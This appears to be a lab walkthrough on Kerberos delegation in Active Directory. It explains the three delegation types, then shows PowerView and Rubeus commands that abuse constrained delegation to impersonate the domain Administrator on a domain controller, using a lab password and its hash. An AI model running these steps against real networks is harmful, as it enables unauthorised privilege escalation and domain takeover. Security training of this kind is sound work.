# Kerberos Constrained Delegation

Kerberos Delegation enables an application to access resources hosted on a different server; for example, 
instead of giving the service account running the web server access to the database directly.

# We can configure three types of delegations in Active Directory:

Unconstrained Delegation (most permissive/broad) </br>
Constrained Delegation </br>
Resource-based Delegation </br>

#  Unconstrained Delegation

With Unconstrained Delegation, a server can impersonate users to any service anywhere in the domain
Simple idea

“I trust this server completely.”

# Constrained Delegation (More secure)

With Constrained Delegation, the server can impersonate users only to specific services explicitly allowed by admins.

This uses:

msDS-AllowedToDelegateTo
Simple idea

“I trust this server, but only for certain services.”

# Resource-Based Constrained Delegation (RBCD)

<img width="1086" height="285" alt="image" src="https://github.com/user-attachments/assets/0601f2d2-9864-4bc7-a6d4-b748b0a95593" />


Simple idea

“The resource decides who may delegate to it.”

<img width="1077" height="486" alt="image" src="https://github.com/user-attachments/assets/a8e66937-5190-4323-b68b-736bf051e294" />

---

# Constrained Delegation (Walkthrough)

## 1. First, import the module and run the Get-NetUser function.

```
import-module .\Powerview-main.ps1
GetNetuser -TrustedToAuth
```
<img width="1296" height="608" alt="image" src="https://github.com/user-attachments/assets/d2ff11dc-f302-40d6-baec-badaa00f4294" />

We can see that the user web_service is set up to delegate the HTTP service to the Domain Controller DC1.


## 2. Since we know the web_service user’s password is Slavi123, let’s use Rubeus to convert the plaintext password to an NTLM hash (RC4-HMAC key in Kerberos).

```
.\Rubeus.exe hash /password:Slavi123

[*] Input password             : Slavi123
[*]       rc4_hmac             : FCDC65703DD2B0BD789977F1F3EEAECF (NTLM hash)
```

## 3. We will use Rubeus to get a ticket for the Administrator account:

```
.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
```
<img width="1312" height="341" alt="image" src="https://github.com/user-attachments/assets/fe9c9deb-e71e-408c-9ce0-04139677b47e" />

## Check New TGS ticket

```
klist
```
<img width="1306" height="353" alt="image" src="https://github.com/user-attachments/assets/b166f5ea-3840-4d37-947e-de6ce786a5f7" />

## 4. Now let's connect to the Domain Controller impersonating the account Administrator

```
PS C:\Users\bob\Downloads> Enter-PSSession dc1
[dc1]: PS C:\Users\Administrator\Documents> whoami
eagle\administrator
```

